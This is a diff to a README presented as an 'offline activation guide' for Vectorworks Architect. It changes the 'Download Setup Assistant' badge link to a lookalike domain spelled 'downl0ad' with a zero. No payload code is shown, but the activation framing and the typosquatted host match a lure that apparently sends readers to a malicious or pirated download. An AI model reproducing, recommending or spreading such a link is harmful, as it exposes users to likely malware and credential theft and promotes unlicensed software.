@@ -1,6 +1,6 @@
 # Vectorworks Architect — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vectorworks-architect.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vectorworks-architect-downl0ad.github.io/.github/)
 
 ## ⚙️ How to Use
 
